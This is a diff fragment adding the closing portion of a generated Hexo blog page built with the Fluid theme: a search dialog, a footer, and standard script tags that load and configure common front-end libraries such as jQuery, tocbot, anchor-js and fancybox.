+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
